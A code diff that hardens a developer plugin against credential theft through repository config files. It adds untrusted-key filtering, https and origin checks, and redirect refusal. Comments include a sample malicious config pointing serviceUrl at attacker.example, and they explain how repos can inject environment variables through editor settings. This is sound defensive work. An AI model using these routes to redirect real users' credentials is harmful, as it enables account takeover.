@@ -1603,14 +1603,125 @@ export function matchLaunch(sessionId, agentId, agentType) {
 }
 
 /**
+ * The keys a repository's own `.teamflow.json` is not allowed to set
+ * (MACLEOD-616).
+ *
+ * A file inside a checkout is untrusted input: whoever published the
+ * repository wrote it, and opening somebody's repository in an editor is
+ * not consent to anything. It may describe the project — which tracker,
+ * which workspace, which repo, what the test command is. It may not
+ * decide where a credential goes or which credential is used.
+ *
+ * It could, until this. `serviceUrl` was merged from the project layer
+ * like any other key, and `credential()` attached this machine's session
+ * to whatever origin the merged config named. A repository containing
+ * `{"serviceUrl": "http://attacker.example"}` collected the device
+ * credential of everybody who opened it, on the first hook, with no
+ * prompt and nothing visibly wrong.
+ *
+ * Each key here either routes a request or authenticates one:
+ *
+ *   * `serviceUrl` — where every report and every members call goes.
+ *   * `authIssuer`, `authClientId` — who signs this machine in, and so
+ *     which identity provider sees the sign-in.
+ *   * `authScopes`, `authApiScope` — what the resulting token is good
+ *     for. Widening them is asking for a credential nobody agreed to.
+ *   * `apiKey`, `accessToken` — a credential, handed over outright.
+ *   * `dataUri`, `awsProfile` — the same attack through S3: a repository
+ *     choosing which of the user's AWS profiles writes where.
+ *   * `oidcAudience` — what a CI token is addressed to, which is the one
+ *     thing stopping a token minted here being spent elsewhere.
+ *
+ * The user's global file (`~/.config/teamflow/config.json`) and the
+ * environment keep full power over all of them. Those are the user
+ * speaking; a file that arrived with a `git clone` is not.
+ *
+ * The value is the environment variable that still sets it, or
+ * `undefined` where the only way is the global file, so `status` and
+ * `doctor` can print the remedy beside the refusal rather than leaving
+ * somebody with a self-hosted service wondering why reporting stopped.
+ */
+export const UNTRUSTED_PROJECT_KEYS = Object.freeze({
+  serviceUrl: 'TEAMFLOW_SERVICE_URL',
+  authIssuer: 'TEAMFLOW_AUTH_ISSUER',
+  authClientId: 'TEAMFLOW_AUTH_CLIENT_ID',
+  authScopes: undefined,
+  authApiScope: undefined,
+  apiKey: 'TEAMFLOW_API_KEY',
+  accessToken: undefined,
+  dataUri: 'TEAMFLOW_DATA_URI',
+  awsProfile: 'TEAMFLOW_AWS_PROFILE',
+  oidcAudience: 'TEAMFLOW_OIDC_AUDIENCE',
+  // Not environment variables at all, and deliberately so. `trustedOrigins`
+  // is the list that lets an ambient credential leave for a service that is
+  // not the hosted one, and `accessTokenOrigin` says a token was minted by
+  // the service it is about to be sent to. Both are the answer to "may this
+  // go there", so neither may be set by anything but the user's own file or
+  // the plugin itself.
+  trustedOrigins: undefined,
+  accessTokenOrigin: undefined,
+});
+
+/** The user's own config, the one place a repository cannot write. */
+export function globalConfigPath() {
+  return path.join(os.homedir(), '.config', 'teamflow', 'config.json');
+}
+
+/**
+ * A repository's config, split into what it may say and what it may not.
+ *
+ * Silence is not an attempt: a key present and empty is the same nothing
+ * `mergeConfig` already skips, so it is dropped without being reported
+ * as ignored. Anything else that is named here is dropped *and* named,
+ * because a silent ignore is a support ticket that reads "TeamFlow
+ * stopped working".
+ */
+export function projectFacts(projectConfig = {}) {
+  const facts = {};
+  const ignored = [];
+  for (const [key, value] of Object.entries(projectConfig || {})) {
+    if (key in UNTRUSTED_PROJECT_KEYS) {
+      if (value !== undefined && value !== '') ignored.push(key);
+      continue;
+    }
+    facts[key] = value;
+  }
+  return { facts, ignored };
+}
+
+/** Which routing or credential keys this checkout's `.teamflow.json` tried to set. */
+export function ignoredProjectKeys(cwd) {
+  return projectFacts(readJson(path.join(cwd, '.teamflow.json'), {})).ignored;
+}
+
+/**
+ * The one line `status` and `doctor` print about it. Names the keys, says
+ * why, and gives the one remedy — because the person reading it is far
+ * more likely to be a developer with a legitimate preview service than
+ * anybody's attacker.
+ */
+export function ignoredProjectLine(keys = []) {
+  if (!keys.length) return undefined;
+  const remedy = keys
+    .map((key) => (UNTRUSTED_PROJECT_KEYS[key] ? `${key} → ${UNTRUSTED_PROJECT_KEYS[key]}` : `${key} → global file only`))
+    .join(', ');
+  return `.teamflow.json set ${keys.join(', ')} — ignored: a file inside a repository may not choose `
+    + 'where a credential goes or which one is used (MACLEOD-616). Set it in the environment, '
+    + `or in ~/.config/teamflow/config.json: ${remedy}`;
+}
+
+/**
  * Three layers, least specific first: the global file, the project's own
  * `.teamflow.json`, then the environment. `mergeConfig` keeps that order and
  * skips the layers that are silent, so an unset variable leaves the file's
  * answer standing and a set one replaces it.
+ *
+ * The project layer is filtered first (`UNTRUSTED_PROJECT_KEYS`). The other
+ * two are not: both are the user speaking.
  */
 export function loadConfig(cwd) {
-  const globalConfig = readJson(path.join(os.homedir(), '.config', 'teamflow', 'config.json'), {});
-  const projectConfig = readJson(path.join(cwd, '.teamflow.json'), {});
+  const globalConfig = readJson(globalConfigPath(), {});
+  const projectConfig = projectFacts(readJson(path.join(cwd, '.teamflow.json'), {})).facts;
   return mergeConfig(globalConfig, projectConfig, {
     serviceUrl: process.env.TEAMFLOW_SERVICE_URL || undefined,
     apiKey: process.env.TEAMFLOW_API_KEY || undefined,
@@ -2321,6 +2432,19 @@ async function lookupGithubIssue(repo, number, config = {}) {
   try {
     const response = await fetch(`${githubApiBase()}/repos/${repo}/issues/${number}`, {
       headers: { Accept: 'application/vnd.github+json', 'User-Agent': 'teamflow-plugin' },
+      /*
+       * The one request in the plugin that follows a redirect, and the
+       * one that carries nothing worth following it with: two headers,
+       * neither a credential, asking a public API for an issue title.
+       *
+       * GitHub answers 301 for a repository that has been renamed, which
+       * is common and invisible — the old name goes on working
+       * everywhere else. Refusing it turned every ticket on a renamed
+       * repository into a card with no title, which is a worse outcome
+       * than the risk: the most a redirect can learn here is that
+       * somebody asked about `owner/repo#n`.
+       */
+      redirect: 'follow',
       signal: AbortSignal.timeout(Number(config.lookupTimeoutMs || 5000)),
     });
     if (!response.ok) return undefined;
@@ -2979,6 +3103,311 @@ export function defaultServiceUrl() {
   return DEFAULT_SERVICE_URL;
 }
 
+// --- where a credential may go (MACLEOD-616) ------------------------
+//
+// One rule, one function, every caller. `credentialDestination` is the
+// only place that decides whether this config's service may be sent a
+// credential, and `credential()`, `auth.accessToken()` and the few
+// places in auth.mjs that carry a token of their own all ask it. A guard
+// written out at each of the dozen call sites is a guard somebody
+// forgets at the thirteenth; `credential-route.test.mjs` fails if a new
+// caller builds a request URL from anything but `serviceUrl(config)`.
+
+/** The origin of a URL, or undefined if it is not one. */
+export function originOf(url) {
+  try {
+    return new URL(String(url)).origin;
+  } catch {
+    return undefined;
+  }
+}
+
+/**
+ * This machine and nobody else's.
+ *
+ * Loopback is the one exception to both rules below, and it is not a
+ * convenience: a request to 127.0.0.1 never leaves the computer, so
+ * there is nothing to exfiltrate and nothing to intercept. Anybody
+ * listening on it can already read `~/.config/teamflow/session.json`.
+ * It is also what lets a preview service, `npm run dev` and the whole
+ * test suite keep working without a certificate.
+ *
+ * Exact names only. `*.localhost` resolves to 127.0.0.1 on most
+ * machines, but that is resolver policy and not a guarantee — a
+ * resolver with a search domain can send `evil.localhost` off the box,
+ * and an exemption that depends on how somebody's DNS is configured is
+ * not an exemption, it is a hole with a comment on it.
+ */
+export function isLoopbackOrigin(origin) {
+  let host;
+  try {
+    host = new URL(String(origin)).hostname.replace(/^\[|\]$/g, '').toLowerCase();
+  } catch {
+    return false;
+  }
+  return host === 'localhost'
+    || host === '::1' || host === '0.0.0.0'
+    || /^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(host);
+}
+
+/**
+ * The origins an ambient credential may be sent to, beyond the hosted
+ * service and this machine (MACLEOD-616 follow-up, F2).
+ *
+ * Read from the user's global file and from nowhere else — not the
+ * environment, and certainly not the repository. "The environment is the
+ * user speaking" is false inside an editor: a repository can ship a
+ * `.claude/settings.json` with an `env` block, an `.envrc`, a
+ * `.vscode/settings.json` terminal environment, and any of them can set
+ * `TEAMFLOW_SERVICE_URL` for every process the editor starts. A session
+ * is saved from that by the origin recorded at sign-in; an API key or a
+ * handed-in access token has no such record, so without this list an
+ * environment variable would be enough to send one anywhere.
+ *
+ * A file in the user's home is a different thing: a repository cannot
+ * write one without already running code on the machine, and at that
+ * point nothing here would have helped anyway.
+ */
+export function trustedOrigins() {
+  const listed = readJson(globalConfigPath(), {})?.trustedOrigins;
+  return (Array.isArray(listed) ? listed : [])
+    .map((entry) => originOf(entry))
+    .filter(Boolean);
+}
+
+/**
+ * Who chose the address this config points at (MACLEOD-616 follow-up,
+ * B1).
+ *
+ * The whole rule turns on this and nothing else had to ask it before.
+ * The first version of the trusted-origin list let `teamflow login`
+ * add the origin it had just signed in against — which sounds like the
+ * user's own act and is not, because the origin came from
+ * `serviceUrl(config)` and a repository sets that through a
+ * `.claude/settings.json` `env` block or an `.envrc`. The remedy became
+ * the attack: the refusal told the victim to run `teamflow login`, the
+ * login wrote the attacker's origin into the victim's own global file,
+ * and every API key afterwards went there with the plugin's blessing.
+ *
+ * So: four answers, and only two of them are a person.
+ *
+ *   * `default`  — the hosted service. Nobody had to say anything.
+ *   * `typed`    — `--service <url>` on the command line, this run.
+ *   * `global`   — `serviceUrl` in the user's own file, which a
+ *                  repository cannot write without already running code.
+ *   * `environment` — anything else. A variable, from a shell profile or
+ *                  from whatever the editor was told to export, and
+ *                  there is no way to tell those two apart from here.
+ *
+ * `environment` is not an accusation; it is an absence of provenance,
+ * and it is treated as one.
+ */
+export function serviceUrlSource(config = {}, typed = undefined) {
+  const origin = originOf(serviceUrl(config));
+  if (!origin) return undefined;
+  if (origin === originOf(defaultServiceUrl())) return 'default';
+  if (typed && originOf(typed) === origin) return 'typed';
+  if (originOf(readJson(globalConfigPath(), {})?.serviceUrl) === origin) return 'global';
+  return 'environment';
+}
+
+/**
+ * Where the address came from, in words, for a refusal to lead with.
+ *
+ * A refusal that says "sign in there instead" is a refusal that talks
+ * the reader into the thing just declined, so the provenance goes first
+ * and the remedy second — and where the provenance is an environment
+ * variable, the reader is told that a repository can set one, because
+ * that is the fact that changes what they do next.
+ */
+export function serviceUrlProvenance(config = {}) {
+  const origin = originOf(serviceUrl(config));
+  if (serviceUrlSource(config) !== 'environment') return undefined;
+  return `TEAMFLOW_SERVICE_URL in this environment names ${origin}. If you did not set that `
+    + 'yourself, the repository you have open did: a `.claude/settings.json` "env" block, an '
+    + '`.envrc` or an editor workspace setting all reach this process.';
+}
+
+/**
+ * May a credential bound to `bound` be sent to the service this config
+ * names? Answers `{ ok: true, origin }` or `{ ok: false, reason }`, and
+ * the reason is written for the person who will read it in `status`.
+ *
+ * Three questions, in the order that makes the answer useful:
+ *
+ *   1. Is it a URL at all? An unparseable `serviceUrl` used to fall
+ *      through `String(...)` and fail at fetch time with a stack.
+ *   2. Is it https, or loopback? A credential never travels in clear
+ *      over a network somebody else can be on.
+ *   3. Is it the origin this credential was issued by? A session is
+ *      bound to the service that signed it in, and to no other. This is
+ *      a refusal, never a fallback: answering with the API key instead
+ *      would be the same credential leaving for the same wrong address
+ *      through a different door.
+ *
+ * `bound` is undefined for a credential the plugin never stored — an API
+ * key or a CI access token, which reach the process from the environment
+ * or the global file, i.e. from the user. There is no origin to compare
+ * to, so those get rules 1 and 2 and not rule 3.
+ *
+ * Rule 3 is not applied to a loopback destination, and that is a
+ * decision rather than an oversight. It buys nothing: a request to this
+ * machine reaches nobody else, and anybody who can listen on it can read
+ * the session file directly. It costs a great deal: every session signed
+ * in before this release records no origin and is read as the hosted
+ * service (see `auth.sessionOrigin`), so enforcing rule 3 on loopback
+ * would stop `npm run dev`, the e2e preview and every existing install
+ * pointed at a local stack from reporting until somebody signed in
+ * again. The attack this is all for needs a *remote* address, and rule 3
+ * is what refuses one.
+ */
+export function credentialDestination(config = {}, bound = undefined) {
+  const target = serviceUrl(config);
+  const origin = originOf(target);
+  if (!origin) {
+    return { ok: false, reason: `the configured serviceUrl (${target}) is not a URL, so no credential was sent` };
+  }
+  const loopback = isLoopbackOrigin(origin);
+  if (!origin.startsWith('https:') && !loopback) {
+    return {
+      ok: false,
+      origin,
+      reason: `refusing to send a credential to ${origin} in clear: https is required for anything but localhost`,
+    };
+  }
+  if (bound && bound !== origin && !loopback) {
+    const provenance = serviceUrlProvenance(config);
+    return {
+      ok: false,
+      origin,
+      // As in `ambientDestination`: no "sign in there instead". Where the
+      // address came from an environment variable, that is the first
+      // thing the reader needs, because it may not have been them.
+      reason: `this machine's credential was issued by ${bound} and was not sent to ${origin}. `
+        + `${provenance ? `${provenance} ` : ''}`
+        // A placeholder, never the declined origin filled in: a line a
+        // hurried person can paste is a line they will paste.
+        + `If ${origin} is genuinely your service, sign in to it deliberately by typing its `
+        + "address yourself — `teamflow login --service <your service's address>` — or put `serviceUrl` in your own "
+        + `${globalConfigPath()}`,
+    };
+  }
+  return { ok: true, origin };
+}
+
+/**
+ * The rule for a credential that records no origin of its own: an API
+ * key, or an access token handed in by something other than an exchange
+ * against the service it is for.
+ *
+ * Rules 1 and 2, and then: the hosted service, this machine, or an
+ * origin the user listed in their own global file. Not wherever the
+ * environment happens to point, because inside an editor the
+ * environment is not reliably the user — see `trustedOrigins`.
+ *
+ * `teamflow login` against another service adds that origin to the list
+ * as it signs in, so the ordinary way to reach a self-hosted stack
+ * needs nothing typed. Somebody using only an API key against one adds
+ * one line to one file, once, and is told exactly which line the first
+ * time they are refused.
+ */
+export function ambientDestination(config = {}) {
+  const target = credentialDestination(config);
+  if (!target.ok) return target;
+  if (target.origin === originOf(defaultServiceUrl())) return target;
+  if (isLoopbackOrigin(target.origin)) return target;
+  if (trustedOrigins().includes(target.origin)) return target;
+  const provenance = serviceUrlProvenance(config);
+  return {
+    ok: false,
+    origin: target.origin,
+    // Provenance first, remedy second, and never "sign in there": the
+    // origin has just been declined, and telling somebody to
+    // authenticate against it is handing over the authorize URL, the
+    // PKCE exchange and an id_token as the price of reading the error
+    // message (MACLEOD-616 follow-up, B1).
+    reason: `${provenance || `no credential on this machine was issued by ${target.origin}`}`
+      + ' An API key or access token is only sent to TeamFlow, to localhost, or to a service you '
+      + `named yourself. If ${target.origin} is genuinely yours, add "trustedOrigins": `
+      + `["${target.origin}"] to ${globalConfigPath()} — by hand, in that file, so the choice is `
+      + 'yours and not an environment variable\'s.',
+  };
+}
+
+/**
+ * The rule for the credential this config would actually use.
+ *
+ * A stored session answers with the origin that issued it. An access
+ * token that came from an exchange against this very service says so
+ * through `accessTokenOrigin`, which only the plugin sets — it is in
+ * `UNTRUSTED_PROJECT_KEYS`, so a repository cannot claim it. Everything
+ * else is ambient.
+ */
+export function credentialTarget(config = {}) {
+  const session = auth.readSession();
+  if (session) {
+    const target = credentialDestination(config, auth.sessionOrigin(session));
+    /*
+     * One refusal has a second cause worth naming (MACLEOD-616).
+     *
+     * A session file with no `serviceOrigin` is read as the hosted
+     * service, so a self-hosted install is refused against its own
+     * address. That is a pre-upgrade session — or a session an older
+     * copy of the plugin on this same machine wrote a moment ago: two
+     * versions share one data directory, and 0.3.18's sign-in builds a
+     * fresh object with no place for the field, so signing in there
+     * strips it. The symptom is identical and the second cause is the
+     * one nobody guesses.
+     */
+    if (!target.ok && !session.serviceOrigin) {
+      return {
+        ...target,
+        reason: `${target.reason}. If you just signed in, check that every copy of the TeamFlow `
+          + 'plugin on this machine is up to date: an older one writes a session without recording '
+          + 'which service issued it',
+      };
+    }
+    return target;
+  }
+  if (config.accessToken && config.accessTokenOrigin) {
+    return credentialDestination(config, originOf(config.accessTokenOrigin));
+  }
+  return ambientDestination(config);
+}
+
+/**
+ * Why no credential will be attached, in words, or undefined when one
+ * will. Synchronous and network-free, so `status`, `doctor`, the hook's
+ * session-start line and the report path can all say the same thing
+ * without a round trip.
+ */
+export function credentialRefusal(config = {}) {
+  const target = credentialTarget(config);
+  return target.ok ? undefined : target.reason;
+}
+
+/**
+ * What a failed `fetch` on the credential path means, in words.
+ *
+ * `redirect: 'error'` is set on every request the plugin makes, so a
+ * service that answers 301 throws here rather than replaying the request
+ * — with its `X-Api-Key`, which `fetch` does NOT strip across origins —
+ * at wherever it was pointed. The hosted deployment does redirect
+ * `www.codercat.io` and `teamflow.macleodlabs.com` to the primary host,
+ * so somebody whose global config still names an old address lands here,
+ * and "service unreachable: fetch failed" would send them looking at
+ * their network.
+ */
+export function unreachableReason(error, config = {}) {
+  const text = error instanceof Error ? String(error.cause?.message || error.message) : String(error);
+  if (/redirect/i.test(text)) {
+    return `${serviceUrl(config)} redirected the request, and a credential does not follow a redirect. `
+      + 'Point serviceUrl (TEAMFLOW_SERVICE_URL, or the global config file) at the address it '
+      + 'redirects to — the primary host, not an alias of it.';
+  }
+  return `service unreachable: ${text}`;
+}
+
 // The one place that turns config into the header the service
 // authenticates with. Ephemeral credentials come first and an API key
 // is the fallback:
@@ -2995,6 +3424,11 @@ export function defaultServiceUrl() {
 // is finally sent, which is the only way a one-hour token survives an
 // hour of being offline.
 export async function credential(config = {}) {
+  // Before anything is resolved: may a credential go where this config
+  // points at all (MACLEOD-616)? A mismatch is a refusal for every kind
+  // at once — falling through to the API key here would send a second
+  // credential to the address the first one was refused for.
+  if (!credentialTarget(config).ok) return undefined;
   if (auth.hasSession()) {
     const token = await auth.accessToken(config);
     if (token.ok) {
@@ -3475,8 +3909,35 @@ function carrierRefusal(account, owner) {
 }
 
 async function postEnvelope(endpoint, envelope, idempotencyKey, config, account = undefined) {
+  /*
+   * The address is rebuilt from `serviceUrl(config)` rather than used as
+   * given (MACLEOD-616 follow-up, F4).
+   *
+   * `sendReport` builds `endpoint` from `serviceUrl(config)` a moment
+   * earlier, but `flushOutbox` reads it off disk: a queued item carries
+   * the whole URL it was addressed to when it was written. That string
+   * is not what `credentialDestination` checked — it checked
+   * `serviceUrl(config)` — so a queued item was the one way a credential
+   * could still meet a URL nothing had validated. It was saved only by
+   * `mayDeliver` comparing the owner's service to the current one, which
+   * is MACLEOD-583's rule doing this one's job by coincidence.
+   *
+   * Only the path and query are kept, so the origin is always the one
+   * the rule approved, and the contract test needs no exception for it.
+   */
+  let route;
+  try {
+    const asked = new URL(String(endpoint));
+    route = `${asked.pathname}${asked.search}`;
+  } catch {
+    return { ok: false, retry: false, reason: `not sent: ${endpoint} is not an address` };
+  }
   const cred = await credential(config);
-  if (!cred) return { ok: false, retry: false, reason: 'no service credential available' };
+  // `credentialRefusal` when there is one: a report that was refused
+  // because the credential does not belong to this service is a
+  // different thing from one that had no credential at all, and only
+  // the first has a remedy (MACLEOD-616).
+  if (!cred) return { ok: false, retry: false, reason: credentialRefusal(config) || 'no service credential available' };
   // Whose report this was, taken from the credential that is about to
   // carry it rather than from the one config would have chosen: a
   // session that will not refresh falls back to an API key, and the
@@ -3490,7 +3951,7 @@ async function postEnvelope(endpoint, envelope, idempotencyKey, config, account 
   const answer = (result) => ({ ...result, owner });
   let response;
   try {
-    response = await fetch(endpoint, {
+    response = await fetch(`${serviceUrl(config)}${route}`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -3498,11 +3959,15 @@ async function postEnvelope(endpoint, envelope, idempotencyKey, config, account 
         'Idempotency-Key': idempotencyKey,
       },
       body: JSON.stringify(envelope),
+      // `Authorization` is stripped by fetch across a redirect; `X-Api-Key`
+      // is not, so a 301 would hand the key to whoever answered it.
+      redirect: 'error',
       signal: AbortSignal.timeout(Number(config.serviceTimeoutMs || 5000)),
     });
   } catch (error) {
-    // Offline, DNS, TLS, timeout. The report is still true, so keep it.
-    return answer({ ok: false, retry: true, reason: `service unreachable: ${error instanceof Error ? error.message : String(error)}` });
+    // Offline, DNS, TLS, timeout, or a redirect this may not follow. The
+    // report is still true, so keep it.
+    return answer({ ok: false, retry: true, reason: unreachableReason(error, config) });
   }
   let body;
   try { body = await response.json(); } catch { body = undefined; }
@@ -3834,6 +4299,7 @@ export async function fetchAccount(config) {
   try {
     const response = await fetch(`${serviceUrl(config)}/v1/account`, {
       headers: { [cred.header]: cred.value },
+      redirect: 'error',
       signal: AbortSignal.timeout(Number(config.serviceTimeoutMs || 5000)),
     });
     let body;
@@ -3843,7 +4309,10 @@ export async function fetchAccount(config) {
     }
     return { ok: true, status: response.status, account: body, credential: cred.kind, email: cred.email, degraded: cred.degraded };
   } catch (error) {
-    return { ok: false, reason: `service unreachable: ${error instanceof Error ? error.message : String(error)}` };
+    // `doctor`'s `serviceAccess` line is where somebody whose config names
+    // an alias of the hosted host will look, so this is one of the two
+    // places the redirect refusal has to explain itself (MACLEOD-616).
+    return { ok: false, reason: unreachableReason(error, config) };
   }
 }
 
@@ -3907,6 +4376,7 @@ export async function fetchState(relativePath, config = {}) {
       `${serviceUrl(config)}/v1/state/tenants/${encodeURIComponent(account)}/${clean}`,
       {
         headers: { [cred.header]: cred.value },
+        redirect: 'error',
         signal: AbortSignal.timeout(Number(config.serviceTimeoutMs || 5000)),
       },
     );
